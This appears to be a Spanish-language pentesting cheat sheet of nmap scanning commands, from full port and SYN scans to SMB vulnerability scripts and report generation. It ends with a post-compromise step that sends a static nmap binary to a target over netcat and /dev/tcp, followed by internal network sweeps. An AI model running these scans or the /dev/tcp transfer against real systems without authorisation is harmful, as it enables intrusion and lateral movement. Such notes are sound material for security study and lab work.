### Escaneos de puertos, servicios y versiones de un host con la herramienta "nmap"

//Escanea todos los puertos abiertos, modo verbose, sin DNS
	`nmap -p- --open -T5 -v -n <ip> -oG allPorts`
	
//Escanea bajo TCP Port Sync Scan, mejora el rendimiento del escaneo
	`nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn <ip> -oG allPorts`

//Escanea los 5000 puertos principales, salida en formato grepeable
	`nmap --top-5000 --open -T5 -v -n <ip> -oG top5000Ports`
	
//Scripts por defecto, servicios y versiones
	`nmap -sC -sV -p21,22,53,80 <ip> -oN targeted`
	
//Comprobación de un puerto específico
	`nmap -p445 --open -T5 -v -n <ip>`
	
//Ejecución de scripts sobre el puerto 445 para buscar vulnerabilidades en SMB	
	`nmap --script "vuln and safe" -p445 10.10.10.40 -oN vulnScan`
	
//Escaneo con salida a formato XML para presentar un reporte
	`nmap -sC -sV -p21,22,53,80 <ip> -oX xmlReport`
	`xsltproc xmlReport > /var/www/html/index.html` --> Pasa xml a html
	`service apache2 start` --> Abrimos servicio Apache para habilitar el puerto 80
	En el navegador podemos ver el index.html --> localhost
	
==================================================================

** Binario de NMAP estático. **
Transferir fichero estático de nmap (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)
> En local --> `nc -nlvp 443 < nmap`
> En la máquina objetivo --> `cat > nmap < /dev/tcp/10.9.6.44/443`
> Comparamos hashes con 'md5sum' para comprobar que la data es idéntica

Ejecución:
> Reconocimiento de la red --> `./nmap -sn 172.16.1.0/24`
> Escaner de puertos sobre un equipo --> `./nmap --open -T5 -v -n -p- 172.16.1.128`
	
